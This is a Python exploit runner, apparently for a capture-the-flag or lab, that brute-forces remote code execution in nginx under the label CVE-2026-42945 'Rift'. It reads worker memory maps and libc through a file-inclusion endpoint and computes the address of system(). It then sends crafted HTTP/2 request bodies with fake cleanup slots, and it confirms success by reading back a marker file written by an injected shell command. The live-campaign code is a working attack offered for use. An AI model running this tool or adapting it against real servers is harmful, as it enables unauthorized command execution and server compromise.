#!/usr/bin/env python3
"""Rift maps-only brute-force runner with bounded candidate scheduling.

This side-track tool keeps the same constraints as the original prototype:
LFI-readable worker maps and libc-on-disk are allowed, but /proc/<pid>/mem,
core dumps, ptrace policy changes, disabled ASLR, debuggers, and target shell
data are not used.
"""

from __future__ import annotations

import argparse
import sys
import time
from collections import OrderedDict
from dataclasses import dataclass
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

import nginx_rifter as rifter
from tools import maps_only_bruteforce_exploit as base


BODY_LEN = rifter.BODY_LEN
DEFAULT_WINDOW_SIZE = 0x10000


@dataclass(frozen=True)
class CandidatePlan:
    stats: base.CandidateStats
    candidates: list[int]
    window_count: int
    full_candidate_count: int


def parse_int_list(value: str) -> list[int]:
    items: list[int] = []
    for part in value.split(","):
        part = part.strip()
        if not part:
            continue
        if ".." in part:
            start_s, end_s = part.split("..", 1)
            start = int(start_s, 0)
            end = int(end_s, 0)
            step = 1 if end >= start else -1
            items.extend(range(start, end + step, step))
        else:
            items.append(int(part, 0))
    return items


def parse_candidate_range(value: str) -> tuple[int, int, str]:
    raw, _, label = value.partition(":")
    start_s, sep, end_s = raw.partition("-")
    if not sep:
        raise argparse.ArgumentTypeError("range must be START-END[:label]")
    start = int(start_s, 0)
    end = int(end_s, 0)
    if end <= start:
        raise argparse.ArgumentTypeError("range end must be greater than start")
    return start, end, label or "manual"


def in_ranges(addr: int, ranges: list[tuple[int, int, str]]) -> bool:
    return any(start <= addr < end for start, end, _label in ranges)


def dedupe_preserving_order(values: list[int]) -> list[int]:
    seen = set()
    result = []
    for value in values:
        if value in seen:
            continue
        seen.add(value)
        result.append(value)
    return result


def window_round_robin(candidates: list[int], window_size: int) -> tuple[list[int], int]:
    buckets: OrderedDict[int, list[int]] = OrderedDict()
    for addr in candidates:
        buckets.setdefault(addr // window_size, []).append(addr)

    ordered: list[int] = []
    for index in range(max((len(bucket) for bucket in buckets.values()), default=0)):
        for bucket in buckets.values():
            if index < len(bucket):
                ordered.append(bucket[index])
    return ordered, len(buckets)


def apply_priority_addresses(
    candidates: list[int],
    priority_addresses: list[int],
    ranges: list[tuple[int, int, str]],
    target_len: int,
    address_mod: int | None,
) -> list[int]:
    if not priority_addresses:
        return candidates

    candidate_set = set(candidates)
    priority = []
    for addr in priority_addresses:
        if addr not in candidate_set:
            if not in_ranges(addr, ranges):
                continue
            if address_mod is not None and addr % 8 != address_mod:
                continue
            if not rifter.addr_low_is_safe(addr, target_len):
                continue
        priority.append(addr)

    priority = dedupe_preserving_order(priority)
    priority_set = set(priority)
    return priority + [addr for addr in candidates if addr not in priority_set]


def build_candidate_plan(
    ranges: list[tuple[int, int, str]],
    *,
    target_len: int,
    address_mod: int | None,
    start_index: int,
    max_candidates: int,
    scan_direction: str,
    candidate_order: str,
    window_size: int,
    priority_addresses: list[int],
) -> CandidatePlan:
    stats, linear = base.iter_candidates(
        ranges,
        target_len=target_len,
        address_mod=address_mod,
        start_index=0,
        max_candidates=0,
        scan_direction=scan_direction,
    )

    if candidate_order == "window-round-robin":
        ordered, window_count = window_round_robin(linear, window_size)
    else:
        ordered = linear
        window_count = len({addr // window_size for addr in linear})

    ordered = apply_priority_addresses(
        ordered,
        priority_addresses,
        ranges,
        target_len,
        address_mod,
    )
    full_candidate_count = len(ordered)
    if start_index:
        ordered = ordered[start_index:]
    if max_candidates:
        ordered = ordered[:max_candidates]

    return CandidatePlan(
        stats=stats,
        candidates=ordered,
        window_count=window_count,
        full_candidate_count=full_candidate_count,
    )


def format_duration(seconds: float) -> str:
    if seconds < 60:
        return f"{seconds:.0f}s"
    if seconds < 3600:
        return f"{seconds / 60:.1f}m"
    return f"{seconds / 3600:.1f}h"


def slot_count(stride: int, phase: int, command_offset: int) -> int:
    return max(0, (command_offset - 24 - phase) // stride + 1)


def print_plan_summary(
    *,
    mod_label: str,
    plan: CandidatePlan,
    args: argparse.Namespace,
    phases: list[int],
    command_offset: int,
) -> None:
    attempts = len(plan.candidates) * len(phases) * args.tries_per_candidate
    estimate = ""
    if args.estimate_rate > 0:
        estimate = f" est={format_duration(attempts / args.estimate_rate)}"
    print(
        f"[*] address_mod={mod_label} order={args.candidate_order} "
        f"windows={plan.window_count} scanned={plan.stats.total} "
        f"safe_seen={plan.stats.safe} selected={len(plan.candidates)} "
        f"attempts={attempts}{estimate}"
    )
    for phase in phases:
        print(
            f"    sled phase={phase} stride={args.body_stride} "
            f"slots={slot_count(args.body_stride, phase, command_offset)}"
        )
    if args.preview_candidates:
        preview = " ".join(f"{addr:#x}" for addr in plan.candidates[: args.preview_candidates])
        print(f"    preview {preview}")


def explain_addresses(
    *,
    addresses: list[int],
    ranges: list[tuple[int, int, str]],
    args: argparse.Namespace,
    address_mods: list[int | None],
) -> None:
    if not addresses:
        return
    print("address explanations")
    for wanted in addresses:
        print(f"  {wanted:#x}")
        for address_mod in address_mods:
            mod_label = "all" if address_mod is None else str(address_mod)
            plan = build_candidate_plan(
                ranges,
                target_len=args.target_len,
                address_mod=address_mod,
                start_index=0,
                max_candidates=0,
                scan_direction=args.scan_direction,
                candidate_order=args.candidate_order,
                window_size=args.window_size,
                priority_addresses=[],
            )
            try:
                index = plan.candidates.index(wanted) + 1
                print(f"    mod={mod_label:<3} index={index} order={args.candidate_order}")
            except ValueError:
                reasons = []
                if not in_ranges(wanted, ranges):
                    reasons.append("outside ranges")
                if address_mod is not None and wanted % 8 != address_mod:
                    reasons.append(f"mod {wanted % 8}, not {address_mod}")
                if not rifter.addr_low_is_safe(wanted, args.target_len):
                    reasons.append("unsafe low bytes")
                print(f"    mod={mod_label:<3} not selected ({', '.join(reasons) or 'not in plan'})")


def run_offline_plan(args: argparse.Namespace) -> int:
    ranges = list(args.candidate_range or [])
    if not ranges:
        print("[!] --offline-plan requires at least one --candidate-range")
        return 2

    phases = args.body_phases or [args.body_phase]
    address_mods = base.parse_address_mods(args.address_mods)
    marker_path = args.marker or f"/tmp/rift_{args.token}"
    proof_command = base.shell_capture_command(args.cmd, marker_path, args.token)
    command_offset = args.command_offset or BODY_LEN - (len(proof_command.encode("utf-8")) + 1)

    print("offline plan   no target traffic; no LFI; no /proc/<pid>/mem; no cores")
    print("candidate ranges")
    for start, end, label in ranges:
        print(f"  {start:#x}-{end:#x} {end - start:#x} {label}")
    print()

    for address_mod in address_mods:
        mod_label = "all" if address_mod is None else str(address_mod)
        plan = build_candidate_plan(
            ranges,
            target_len=args.target_len,
            address_mod=address_mod,
            start_index=args.start_index,
            max_candidates=args.max_candidates,
            scan_direction=args.scan_direction,
            candidate_order=args.candidate_order,
            window_size=args.window_size,
            priority_addresses=args.priority_address,
        )
        print_plan_summary(
            mod_label=mod_label,
            plan=plan,
            args=args,
            phases=phases,
            command_offset=command_offset,
        )

    explain_addresses(
        addresses=args.explain_address,
        ranges=ranges,
        args=args,
        address_mods=address_mods,
    )
    return 0


def run_live_campaign(args: argparse.Namespace) -> int:
    args.host, args.port = rifter.parse_target(args.target, args.port)
    target = base.make_target(args)
    phases = args.body_phases or [args.body_phase]
    address_mods = base.parse_address_mods(args.address_mods)

    print(f"target        {args.host}:{args.port}")
    print("primitive     LFI maps/libc + marker proof; no /proc/<pid>/mem; no core parsing")
    print("scope         CVE-2026-42945/Rift side-track; not the nginx/1.31.1 Nebusec path")
    print("ptrace rule   target OS ptrace policy is not changed by this tool")
    print(f"command       {args.cmd}")
    print()

    if not rifter.wait_alive(args.host, args.port, timeout=20):
        print("[!] nginx is not responding")
        return 2

    facts, php_uid, master_pid = rifter.find_worker(target, args.max_pid, args.pid_file)
    system_offset, system_addr = rifter.derive_system(target, facts.libc_path, facts.libc_base)
    facts, maps = base.maybe_profile_heap_growth(target, facts, args)

    ptrace_scope = ""
    randomize_va_space = ""
    try:
        ptrace_scope = target.lfi_text("/proc/sys/kernel/yama/ptrace_scope", timeout=2).strip()
    except Exception:
        pass
    try:
        randomize_va_space = target.lfi_text("/proc/sys/kernel/randomize_va_space", timeout=2).strip()
    except Exception:
        pass

    print(f"php uid       {php_uid}")
    print(f"master pid    {master_pid}")
    print(f"worker pid    {facts.worker_pid}")
    if ptrace_scope:
        print(f"ptrace_scope  {ptrace_scope}")
    if randomize_va_space:
        print(f"ASLR mode     {randomize_va_space}")
    print(f"nginx rw      {facts.nginx_rw_base:#x}")
    print(f"libc base     {facts.libc_base:#x}")
    print(f"system        {system_addr:#x} (offset {system_offset:#x})")

    ranges = base.candidate_ranges_from_maps(maps, args.max_region, args.include_other_rw)
    if not ranges:
        print("[!] no candidate writable ranges found from worker maps")
        return 2

    print("candidate ranges")
    for start, end, label in ranges:
        print(f"  {start:#x}-{end:#x} {end - start:#x} {label}")
    print()

    marker_path = args.marker or f"/tmp/rift_{args.token}"
    proof_command = base.shell_capture_command(args.cmd, marker_path, args.token)
    command_bytes = len(proof_command.encode("utf-8")) + 1
    command_offset = args.command_offset or BODY_LEN - command_bytes

    print(f"marker        {marker_path}")
    print(f"token         {args.token}")
    print(f"candidate     order={args.candidate_order} window_size={args.window_size:#x}")
    if args.sled_mode == "per-slot-command" and command_bytes > args.body_stride - 24:
        print("[!] proof command is too long for the selected body stride")
        print(f"    proof bytes={command_bytes}, stride room={args.body_stride - 24}")
        return 2
    print()

    start_time = time.time()
    total_attempts = 0

    for address_mod in address_mods:
        mod_label = "all" if address_mod is None else str(address_mod)
        plan = build_candidate_plan(
            ranges,
            target_len=args.target_len,
            address_mod=address_mod,
            start_index=args.start_index,
            max_candidates=args.max_candidates,
            scan_direction=args.scan_direction,
            candidate_order=args.candidate_order,
            window_size=args.window_size,
            priority_addresses=args.priority_address,
        )
        print_plan_summary(
            mod_label=mod_label,
            plan=plan,
            args=args,
            phases=phases,
            command_offset=command_offset,
        )
        if args.dry_run:
            continue

        for index, addr in enumerate(plan.candidates, start=1):
            for phase in phases:
                if args.time_budget and time.time() - start_time > args.time_budget:
                    print("[!] time budget exhausted")
                    return 3

                target_bytes = rifter.low_bytes(addr, args.target_len)
                body = base.make_cleanup_sled_body(
                    mode=args.sled_mode,
                    candidate_addr=addr,
                    system_addr=system_addr,
                    command=proof_command,
                    stride=args.body_stride,
                    phase=phase,
                    command_offset=args.command_offset,
                )

                if not rifter.wait_alive(args.host, args.port, timeout=args.recovery_timeout):
                    print("[!] nginx did not recover before attempt")
                    return 2

                for try_no in range(args.tries_per_candidate):
                    total_attempts += 1
                    if (
                        args.verbose
                        or total_attempts == 1
                        or total_attempts % args.progress_every == 0
                    ):
                        elapsed = max(0.001, time.time() - start_time)
                        rate = total_attempts / elapsed
                        print(
                            f"    try={total_attempts} candidate={index} "
                            f"phase={phase} mod={mod_label} addr={addr:#x} "
                            f"low={target_bytes.hex()} rate={rate:.2f}/s"
                        )

                    rifter.attempt(
                        args.host,
                        args.port,
                        target_bytes,
                        body,
                        h2_victim=True,
                        a_count=args.a_count,
                        plus_count=args.plus_count,
                    )
                    time.sleep(args.proof_delay)
                    marker = base.read_marker(target, marker_path, args.token)
                    if marker is not None:
                        print()
                        print("[+] CTF WIN: marker token read back through the LFI primitive")
                        print(f"    winning address: {addr:#x}")
                        print(f"    low bytes:       {target_bytes.hex()}")
                        print(f"    phase:           {phase}")
                        print(f"    attempts:        {total_attempts}")
                        print()
                        print(marker)
                        return 0

    if args.dry_run:
        return 0
    print("[!] exhausted selected candidates without marker proof")
    return 1


def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        description="Bounded maps-only brute-force scheduler for authorized NGINX Rift labs."
    )
    parser.add_argument("--target", default=rifter.DEFAULT_TARGET, help="target as HOST:PORT")
    parser.add_argument("--port", type=int, default=19321, help="fallback port when --target omits one")
    parser.add_argument("--scheme", choices=("http", "https"), default="http")
    parser.add_argument("--lfi-endpoint", default="/lfi.php")
    parser.add_argument("--file-param", default="file")
    parser.add_argument("--offset-param", default="offset")
    parser.add_argument("--length-param", default="length")
    parser.add_argument("--file-read-template")
    parser.add_argument("--pid-file", action="append", default=list(rifter.DEFAULT_PID_FILES))
    parser.add_argument("--max-pid", type=int, default=65535)
    parser.add_argument("--timeout", type=float, default=5)
    parser.add_argument("--cmd", default="id", help="command to execute if the candidate lands")
    parser.add_argument("--token", default=None, help="marker token; generated if omitted")
    parser.add_argument("--marker", help="marker path; default uses /tmp/rift_<token>")
    parser.add_argument("--target-len", type=int, default=2, help="low address bytes overwritten")
    parser.add_argument("--address-mods", default=str(base.DEFAULT_ADDRESS_MOD), help="candidate addr %% 8 priority, comma list, or 'all'")
    parser.add_argument("--body-stride", type=int, default=base.DEFAULT_BODY_STRIDE, help="distance between fake cleanup slots in each body")
    parser.add_argument("--body-phase", type=int, default=0, help="first fake cleanup offset inside each body")
    parser.add_argument("--body-phases", type=parse_int_list, help="comma/range list of body phases, e.g. 0,8,16 or 0..31")
    parser.add_argument("--sled-mode", choices=("shared-command", "per-slot-command"), default="shared-command")
    parser.add_argument("--command-offset", type=int, default=0, help="shared-command mode command offset; 0 means body end")
    parser.add_argument("--scan-direction", choices=("asc", "desc"), default="asc", help="candidate address order before scheduling")
    parser.add_argument("--candidate-order", choices=("linear", "window-round-robin"), default="window-round-robin")
    parser.add_argument("--window-size", type=int, default=DEFAULT_WINDOW_SIZE, help="preserved-high-byte bucket size")
    parser.add_argument("--priority-address", action="append", type=rifter.parse_addr, default=[], help="candidate address to try before scheduled candidates")
    parser.add_argument("--explain-address", action="append", type=rifter.parse_addr, default=[], help="show where an address falls in the selected schedule")
    parser.add_argument("--candidate-range", action="append", type=parse_candidate_range, help="offline range START-END[:label]; implies --offline-plan")
    parser.add_argument("--offline-plan", action="store_true", help="plan from --candidate-range without target traffic")
    parser.add_argument("--dry-run", action="store_true", help="derive/print the live plan but do not send exploit attempts")
    parser.add_argument("--preview-candidates", type=int, default=10)
    parser.add_argument("--estimate-rate", type=float, default=0.8, help="attempts/sec used for duration estimates; 0 disables")
    parser.add_argument("--a-count", type=int, default=rifter.DEFAULT_A_COUNT)
    parser.add_argument("--plus-count", type=int, default=rifter.DEFAULT_PLUS_COUNT)
    parser.add_argument("--max-region", type=int, default=32 * 1024 * 1024, help="largest writable mapping to scan")
    parser.add_argument("--include-other-rw", action="store_true", help="also scan non-heap nginx/anonymous writable mappings")
    parser.add_argument("--start-index", type=int, default=0, help="skip candidates after ordering")
    parser.add_argument("--max-candidates", type=int, default=0, help="cap candidates per address-mod pass; 0 means no cap")
    parser.add_argument("--tries-per-candidate", type=int, default=1)
    parser.add_argument("--proof-delay", type=float, default=0.15)
    parser.add_argument("--recovery-timeout", type=int, default=20)
    parser.add_argument("--time-budget", type=float, default=0, help="seconds; 0 means no time budget")
    parser.add_argument("--progress-every", type=int, default=50)
    parser.add_argument("--profile-spray", dest="profile_spray", action="store_true", default=True)
    parser.add_argument("--no-profile-spray", dest="profile_spray", action="store_false")
    parser.add_argument("--profile-spray-count", type=int, default=20)
    parser.add_argument("--profile-spray-delay", type=int, default=10)
    parser.add_argument("--profile-spray-settle", type=float, default=0.3)
    parser.add_argument("--profile-post-close-delay", type=float, default=0.2)
    parser.add_argument("-v", "--verbose", action="store_true")
    return parser


def validate_args(parser: argparse.ArgumentParser, args: argparse.Namespace) -> None:
    if args.token is None:
        import secrets

        args.token = secrets.token_hex(4)
    if args.target_len < 1 or args.target_len > 6:
        parser.error("--target-len must be between 1 and 6")
    min_stride = 24 if args.sled_mode == "shared-command" else 40
    if args.body_stride < min_stride:
        parser.error(f"--body-stride must be >= {min_stride} for {args.sled_mode}")
    phases = args.body_phases or [args.body_phase]
    if not phases:
        parser.error("--body-phases cannot be empty")
    for phase in phases:
        if phase < 0 or phase >= args.body_stride:
            parser.error("body phases must be in [0, --body-stride)")
    if args.progress_every < 1:
        parser.error("--progress-every must be positive")
    if args.window_size < 0x100:
        parser.error("--window-size must be at least 0x100")
    if args.start_index < 0:
        parser.error("--start-index must be non-negative")
    if args.max_candidates < 0:
        parser.error("--max-candidates must be non-negative")
    if args.preview_candidates < 0:
        parser.error("--preview-candidates must be non-negative")
    if args.candidate_range:
        args.offline_plan = True
    if args.offline_plan and not args.candidate_range:
        parser.error("--offline-plan requires at least one --candidate-range")


def main() -> int:
    if hasattr(sys.stdout, "reconfigure"):
        sys.stdout.reconfigure(line_buffering=True)
    parser = build_parser()
    args = parser.parse_args()
    validate_args(parser, args)
    if args.offline_plan:
        return run_offline_plan(args)
    return run_live_campaign(args)


if __name__ == "__main__":
    raise SystemExit(main())
